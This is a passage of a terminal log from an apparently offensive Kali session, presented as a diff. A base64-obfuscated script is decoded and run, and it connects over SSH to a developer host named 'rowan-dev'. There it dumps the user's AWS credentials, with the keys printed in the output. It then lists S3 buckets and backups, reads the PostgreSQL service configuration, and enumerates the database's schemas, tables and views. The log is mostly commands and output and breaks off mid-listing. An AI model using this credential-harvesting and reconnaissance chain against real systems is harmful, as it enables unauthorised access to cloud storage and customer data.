@@ -1,0 +1,259 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/w14r14.sh <<'B64EOF'
+> IyEvYmluL2Jhc2gKUz0ic3NoIC1vIEJhdGNoTW9kZT15ZXMgLW8gU3RyaWN0SG9zdEtleUNoZWNraW5nPW5vIC1vIENvbm5lY3RUaW1lb3V0PTEwIHJvd2FuLWRldiIKJFMgJ3NldCAteAplY2hvICI9PT0gYXdzIGNvbmZpZyI7IGNhdCB+Ly5hd3MvY29uZmlnIH4vLmF3cy9jcmVkZW50aWFscyAyPi9kZXYvbnVsbAplY2hvICI9PT0gczMgbHMiOyBhd3MgLS1lbmRwb2ludC11cmwgaHR0cHM6Ly9vYmplY3RzLmtlcGxlcm9wcy50ZXN0IHMzIGxzIDI+JjEgfCBoZWFkIC00MAplY2hvICI9PT0gczMgZmllbGRsaW5rLWV4cG9ydHMiOyBhd3MgLS1lbmRwb2ludC11cmwgaHR0cHM6Ly9vYmplY3RzLmtlcGxlcm9wcy50ZXN0IHMzIGxzIHMzOi8vZmllbGRsaW5rLWV4cG9ydHMgMj4mMSB8IGhlYWQgLTQwCmVjaG8gIj09PSBzMyByZWN1cnNpdmUiOyBhd3MgLS1lbmRwb2ludC11cmwgaHR0cHM6Ly9vYmplY3RzLmtlcGxlcm9wcy50ZXN0IHMzIGxzIC0tcmVjdXJzaXZlIHMzOi8vZmllbGRsaW5rLWV4cG9ydHMgMj4mMSB8IGhlYWQgLTEwMAplY2hvICI9PT0gcHNxbCBzZXJ2aWNlIjsgY2F0IH4vLnBnX3NlcnZpY2UuY29uZgpwc3FsIHNlcnZpY2U9ZmllbGRsaW5rIC1jICJcZG4iIDI+JjEgfCBoZWFkIC00MApwc3FsIHNlcnZpY2U9ZmllbGRsaW5rIC1jICJcZHQgKi4qIiAyPiYxIHwgaGVhZCAtMTIwCnBzcWwgc2VydmljZT1maWVsZGxpbmsgLWMgIlxkdiAqLioiIDI+JjEgfCBoZWFkIC04MAonIDI+JjEK
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/w14r14.sh; bash /tmp/w14r14.sh; echo DONEMARK_1795199607796$((6*7))
+=== aws config
++ echo '=== aws config'
++ cat /home/rowan/.aws/config /home/rowan/.aws/credentials
+[default]
+region=us-east-1
+ca_bundle=/home/rowan/.local/share/keplerops/ca.crt
+s3=
+    addressing_style=path
+[default]
+aws_access_key_id=GAX0wNnSB1w04RwfLLBvbme_ZhdMYSqbZqFpTuPmD5o
+aws_secret_access_key=7YOhGW15uzY1crdHT3PIrR2FVzbxaqgQ6mm51oYOVlE
+=== s3 ls
++ echo '=== s3 ls'
++ aws --endpoint-url https://objects.keplerops.test s3 ls
++ head -40
+2026-11-19 07:11:39 fieldlink-exports
+=== s3 fieldlink-exports
++ echo '=== s3 fieldlink-exports'
++ aws --endpoint-url https://objects.keplerops.test s3 ls s3://fieldlink-exports
++ head -40
+                           PRE backups/
+=== s3 recursive
++ echo '=== s3 recursive'
++ aws --endpoint-url https://objects.keplerops.test s3 ls --recursive s3://fieldlink-exports
++ head -100
+2026-11-19 07:11:42       4234 backups/company-history.dump
+=== psql service
++ echo '=== psql service'
++ cat /home/rowan/.pg_service.conf
+[fieldlink]
+host=data.keplerops.test
+port=5432
+dbname=fieldlink_data
+user=rowan_data
+sslmode=verify-full
+sslrootcert=/home/rowan/.local/share/keplerops/ca.crt
++ psql service=fieldlink -c '\dn'
++ head -40
+         List of schemas
+   Name    |        Owner         
+-----------+----------------------
+ export    | fieldlink_data_owner
+ public    | pg_database_owner
+ support   | fieldlink_data_owner
+ workspace | rowan_data
+(4 rows)
+
++ psql service=fieldlink -c '\dt *.*'
++ head -120
+                                  List of relations
+       Schema       |            Name            |    Type     |        Owner         
+--------------------+----------------------------+-------------+----------------------
+ export             | partition_bindings         | table       | fieldlink_data_owner
+ information_schema | sql_features               | table       | fieldlink_admin
+ information_schema | sql_implementation_info    | table       | fieldlink_admin
+ information_schema | sql_parts                  | table       | fieldlink_admin
+ information_schema | sql_sizing                 | table       | fieldlink_admin
+ pg_catalog         | pg_aggregate               | table       | fieldlink_admin
+ pg_catalog         | pg_am                      | table       | fieldlink_admin
+ pg_catalog         | pg_amop                    | table       | fieldlink_admin
+ pg_catalog         | pg_amproc                  | table       | fieldlink_admin
+ pg_catalog         | pg_attrdef                 | table       | fieldlink_admin
+ pg_catalog         | pg_attribute               | table       | fieldlink_admin
+ pg_catalog         | pg_auth_members            | table       | fieldlink_admin
+ pg_catalog         | pg_authid                  | table       | fieldlink_admin
+ pg_catalog         | pg_cast                    | table       | fieldlink_admin
+ pg_catalog         | pg_class                   | table       | fieldlink_admin
+ pg_catalog         | pg_collation               | table       | fieldlink_admin
+ pg_catalog         | pg_constraint              | table       | fieldlink_admin
+ pg_catalog         | pg_conversion              | table       | fieldlink_admin
+ pg_catalog         | pg_database                | table       | fieldlink_admin
+ pg_catalog         | pg_db_role_setting         | table       | fieldlink_admin
+ pg_catalog         | pg_default_acl             | table       | fieldlink_admin
+ pg_catalog         | pg_depend                  | table       | fieldlink_admin
+ pg_catalog         | pg_description             | table       | fieldlink_admin
+ pg_catalog         | pg_enum                    | table       | fieldlink_admin
+ pg_catalog         | pg_event_trigger           | table       | fieldlink_admin
+ pg_catalog         | pg_extension               | table       | fieldlink_admin
+ pg_catalog         | pg_foreign_data_wrapper    | table       | fieldlink_admin
+ pg_catalog         | pg_foreign_server          | table       | fieldlink_admin
+ pg_catalog         | pg_foreign_table           | table       | fieldlink_admin
+ pg_catalog         | pg_index                   | table       | fieldlink_admin
+ pg_catalog         | pg_inherits                | table       | fieldlink_admin
+ pg_catalog         | pg_init_privs              | table       | fieldlink_admin
+ pg_catalog         | pg_language                | table       | fieldlink_admin
+ pg_catalog         | pg_largeobject             | table       | fieldlink_admin
+ pg_catalog         | pg_largeobject_metadata    | table       | fieldlink_admin
+ pg_catalog         | pg_namespace               | table       | fieldlink_admin
+ pg_catalog         | pg_opclass                 | table       | fieldlink_admin
+ pg_catalog         | pg_operator                | table       | fieldlink_admin
+ pg_catalog         | pg_opfamily                | table       | fieldlink_admin
+ pg_catalog         | pg_parameter_acl           | table       | fieldlink_admin
+ pg_catalog         | pg_partitioned_table       | table       | fieldlink_admin
+ pg_catalog         | pg_policy                  | table       | fieldlink_admin
+ pg_catalog         | pg_proc                    | table       | fieldlink_admin
+ pg_catalog         | pg_publication             | table       | fieldlink_admin
+ pg_catalog         | pg_publication_namespace   | table       | fieldlink_admin
+ pg_catalog         | pg_publication_rel         | table       | fieldlink_admin
+ pg_catalog         | pg_range                   | table       | fieldlink_admin
+ pg_catalog         | pg_replication_origin      | table       | fieldlink_admin
+ pg_catalog         | pg_rewrite                 | table       | fieldlink_admin
+ pg_catalog         | pg_seclabel                | table       | fieldlink_admin
+ pg_catalog         | pg_sequence                | table       | fieldlink_admin
+ pg_catalog         | pg_shdepend                | table       | fieldlink_admin
+ pg_catalog         | pg_shdescription           | table       | fieldlink_admin
+ pg_catalog         | pg_shseclabel              | table       | fieldlink_admin
+ pg_catalog         | pg_statistic               | table       | fieldlink_admin
+ pg_catalog         | pg_statistic_ext           | table       | fieldlink_admin
+ pg_catalog         | pg_statistic_ext_data      | table       | fieldlink_admin
+ pg_catalog         | pg_subscription            | table       | fieldlink_admin
+ pg_catalog         | pg_subscription_rel        | table       | fieldlink_admin
+ pg_catalog         | pg_tablespace              | table       | fieldlink_admin
+ pg_catalog         | pg_transform               | table       | fieldlink_admin
+ pg_catalog         | pg_trigger                 | table       | fieldlink_admin
+ pg_catalog         | pg_ts_config               | table       | fieldlink_admin
+ pg_catalog         | pg_ts_config_map           | table       | fieldlink_admin
+ pg_catalog         | pg_ts_dict                 | table       | fieldlink_admin
+ pg_catalog         | pg_ts_parser               | table       | fieldlink_admin
+ pg_catalog         | pg_ts_template             | table       | fieldlink_admin
+ pg_catalog         | pg_type                    | table       | fieldlink_admin
+ pg_catalog         | pg_user_mapping            | table       | fieldlink_admin
+ pg_toast           | pg_toast_1213              | TOAST table | fieldlink_admin
+ pg_toast           | pg_toast_1247              | TOAST table | fieldlink_admin
+ pg_toast           | pg_toast_1255              | TOAST table | fieldlink_admin
+ pg_toast           | pg_toast_1260              | TOAST table | fieldlink_admin
+ pg_toast           | pg_toast_1262              | TOAST table | fieldlink_admin
+ pg_toast           | pg_toast_13494             | TOAST table | fieldlink_admin
+ pg_toast           | pg_toast_13499             | TOAST table | fieldlink_admin
+ pg_toast           | pg_toast_13504             | TOAST table | fieldlink_admin
+ pg_toast           | pg_toast_13509             | TOAST table | fieldlink_admin
+ pg_toast           | pg_toast_1417              | TOAST table | fieldlink_admin
+ pg_toast           | pg_toast_1418              | TOAST table | fieldlink_admin
+ pg_toast           | pg_toast_16393             | TOAST table | fieldlink_data_owner
+ pg_toast           | pg_toast_16402             | TOAST table | fieldlink_data_owner
+ pg_toast           | pg_toast_19148             | TOAST table | fieldlink_admin
+ pg_toast           | pg_toast_2328              | TOAST table | fieldlink_admin
+ pg_toast           | pg_toast_2396              | TOAST table | fieldlink_admin
+ pg_toast           | pg_toast_2600              | TOAST table | fieldlink_admin
+ pg_toast           | pg_toast_2604              | TOAST table | fieldlink_admin
+ pg_toast           | pg_toast_2606              | TOAST table | fieldlink_admin
+ pg_toast           | pg_toast_2609              | TOAST table | fieldlink_admin
+ pg_toast           | pg_toast_2612              | TOAST table | fieldlink_admin
+ pg_toast           | pg_toast_2615              | TOAST table | fieldlink_admin
+ pg_toast           | pg_toast_2618              | TOAST table | fieldlink_admin
+ pg_toast           | pg_toast_2619              | TOAST table | fieldlink_admin
+ pg_toast           | pg_toast_2620              | TOAST table | fieldlink_admin
+ pg_toast           | pg_toast_2964              | TOAST table | fieldlink_admin
+ pg_toast           | pg_toast_3079              | TOAST table | fieldlink_admin
+ pg_toast           | pg_toast_3118              | TOAST table | fieldlink_admin
+ pg_toast           | pg_toast_3256              | TOAST table | fieldlink_admin
+ pg_toast           | pg_toast_3350              | TOAST table | fieldlink_admin
+ pg_toast           | pg_toast_3381              | TOAST table | fieldlink_admin
+ pg_toast           | pg_toast_3394              | TOAST table | fieldlink_admin
+ pg_toast           | pg_toast_3429              | TOAST table | fieldlink_admin
+ pg_toast           | pg_toast_3456              | TOAST table | fieldlink_admin
+ pg_toast           | pg_toast_3466              | TOAST table | fieldlink_admin
+ pg_toast           | pg_toast_3592              | TOAST table | fieldlink_admin
+ pg_toast           | pg_toast_3596              | TOAST table | fieldlink_admin
+ pg_toast           | pg_toast_3600              | TOAST table | fieldlink_admin
+ pg_toast           | pg_toast_6000              | TOAST table | fieldlink_admin
+ pg_toast           | pg_toast_6100              | TOAST table | fieldlink_admin
+ pg_toast           | pg_toast_6106              | TOAST table | fieldlink_admin
+ pg_toast           | pg_toast_6243              | TOAST table | fieldlink_admin
+ pg_toast           | pg_toast_826               | TOAST table | fieldlink_admin
+ support            | customer_migration_history | table       | fieldlink_data_owner
+ support            | customer_records           | table       | fieldlink_admin
+(114 rows)
+
++ psql service=fieldlink -c '\dv *.*'
++ head -80
+                                  List of relations
+       Schema       |                 Name                  | Type |      Owner      
+--------------------+---------------------------------------+------+-----------------
+ information_schema | _pg_foreign_data_wrappers             | view | fieldlink_admin
+ information_schema | _pg_foreign_servers                   | view | fieldlink_admin
+ information_schema | _pg_foreign_table_columns             | view | fieldlink_admin
+ information_schema | _pg_foreign_tables                    | view | fieldlink_admin
+ information_schema | _pg_user_mappings                     | view | fieldlink_admin
+ information_schema | administrable_role_authorizations     | view | fieldlink_admin
+ information_schema | applicable_roles                      | view | fieldlink_admin
+ information_schema | attributes                            | view | fieldlink_admin
+ information_schema | character_sets                        | view | fieldlink_admin
+ information_schema | check_constraint_routine_usage        | view | fieldlink_admin
+ information_schema | check_constraints                     | view | fieldlink_admin
+ information_schema | collation_character_set_applicability | view | fieldlink_admin
+ information_schema | collations                            | view | fieldlink_admin
+ information_schema | column_column_usage                   | view | fieldlink_admin
+ information_schema | column_domain_usage                   | view | fieldlink_admin
+ information_schema | column_options                        | view | fieldlink_admin
+ information_schema | column_privileges                     | view | fieldlink_admin
+ information_schema | column_udt_usage                      | view | fieldlink_admin
+ information_schema | columns                               | view | fieldlink_admin
+ information_schema | constraint_column_usage               | view | fieldlink_admin
+ information_schema | constraint_table_usage                | view | fieldlink_admin
+ information_schema | data_type_privileges                  | view | fieldlink_admin
+ information_schema | domain_constraints                    | view | fieldlink_admin
+ information_schema | domain_udt_usage                      | view | fieldlink_admin
+ information_schema | domains                               | view | fieldlink_admin
+ information_schema | element_types                         | view | fieldlink_admin
+ information_schema | enabled_roles                         | view | fieldlink_admin
+ information_schema | foreign_data_wrapper_options          | view | fieldlink_admin
+ information_schema | foreign_data_wrappers                 | view | fieldlink_admin
+ information_schema | foreign_server_options                | view | fieldlink_admin
+ information_schema | foreign_servers                       | view | fieldlink_admin
+ information_schema | foreign_table_options                 | view | fieldlink_admin
+ information_schema | foreign_tables                        | view | fieldlink_admin
+ information_schema | information_schema_catalog_name       | view | fieldlink_admin
+ information_schema | key_column_usage                      | view | fieldlink_admin
+ information_schema | parameters                            | view | fieldlink_admin
+ information_schema | referential_constraints               | view | fieldlink_admin
+ information_schema | role_column_grants                    | view | fieldlink_admin
+ information_schema | role_routine_grants                   | view | fieldlink_admin
+ information_schema | role_table_grants                     | view | fieldlink_admin
+ information_schema | role_udt_grants                       | view | fieldlink_admin
+ information_schema | role_usage_grants                     | view | fieldlink_admin
+ information_schema | routine_column_usage                  | view | fieldlink_admin
+ information_schema | routine_privileges                    | view | fieldlink_admin
+ information_schema | routine_routine_usage                 | view | fieldlink_admin
+ information_schema | routine_sequence_usage                | view | fieldlink_admin
+ information_schema | routine_table_usage                   | view | fieldlink_admin
+ information_schema | routines                              | view | fieldlink_admin
+ information_schema | schemata                              | view | fieldlink_admin
+ information_schema | sequences                             | view | fieldlink_admin
+ information_schema | table_constraints                     | view | fieldlink_admin
+ information_schema | table_privileges                      | view | fieldlink_admin
+ information_schema | tables                                | view | fieldlink_admin
+ information_schema | transforms                            | view | fieldlink_admin
+ information_schema | triggered_update_columns              | view | fieldlink_admin
+ information_schema | triggers                              | view | fieldlink_admin
+ information_schema | udt_privileges                        | view | fieldlink_admin
+ information_schema | usage_privileges                      | view | fieldlink_admin
+ information_schema | user_defined_types                    | view | fieldlink_admin
+ information_schema | user_mapping_options                  | view | fieldlink_admin
+ information_schema | user_mappings                         | view | fieldlink_admin
+ information_schema | view_column_usage                     | view | fieldlink_admin
+ information_schema | view_routine_usage                    | view | fieldlink_admin
+ information_schema | view_table_usage                      | view | fieldlink_admin
+ information_schema | views                                 | view | fieldlink_admin
+ pg_catalog         | pg_available_extension_versions       | view | fieldlink_admin
+ pg_catalog         | pg_available_extensions               | view | fieldlink_admin
+ pg_catalog         | pg_backend_memory_contexts            | view | fieldlink_admin
+ pg_catalog         | pg_config                             | view | fieldlink_admin
+ pg_catalog         | pg_cursors                            | view | fieldlink_admin
+ pg_catalog         | pg_file_settings                      | view | fieldlink_admin
+ pg_catalog         | pg_group                              | view | fieldlink_admin
+ pg_catalog         | pg_hba_file_rules                     | view | fieldlink_admin
+ pg_catalog         | pg_ident_file_mappings                | view | fieldlink_admin
+ pg_catalog         | pg_indexes                            | view | fieldlink_admin
+ pg_catalog         | pg_locks                              | view | fieldlink_admin
+ pg_catalog         | pg_matviews                           | view | fieldlink_admin
